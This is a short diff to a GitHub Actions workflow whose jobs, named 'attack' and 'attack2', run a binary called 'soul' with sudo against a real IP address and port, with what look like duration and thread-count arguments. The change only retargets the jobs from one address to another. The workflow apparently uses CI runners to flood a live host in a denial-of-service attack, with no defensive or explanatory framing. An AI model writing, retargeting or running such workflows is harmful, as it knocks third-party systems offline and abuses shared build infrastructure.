@@ -10,7 +10,7 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 20.235.51.182 23973 240 999
+    - run: sudo ./soul 74.225.177.241 12369 240 999
   
   attack2:
     runs-on: ubuntu-22.04
@@ -20,4 +20,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 20.235.51.182 23973 240 999
+    - run: sudo ./soul 74.225.177.241 12369 240 999
